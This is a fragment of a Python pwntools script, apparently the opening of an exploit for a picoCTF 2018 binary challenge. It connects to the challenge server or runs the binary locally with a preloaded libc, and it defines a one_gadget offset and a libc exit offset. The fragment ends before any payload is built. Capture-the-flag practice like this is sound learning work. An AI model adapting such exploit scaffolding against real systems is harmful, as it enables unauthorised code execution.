#!/usr/bin/env python

from pwn import *

pico = 1

if pico:
	r = remote("2018shell2.picoctf.com", 48403)
else:
	env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./pico64.libc.so.6")}
	r = process("./NO-ARGS",env=env)
	# gdb.attach(r, '''
	# 	b *0x400eb1
	# 	c
	# 	''')

ONE_GADGET = 0x45216
LIBC_EXIT = 0x3a030

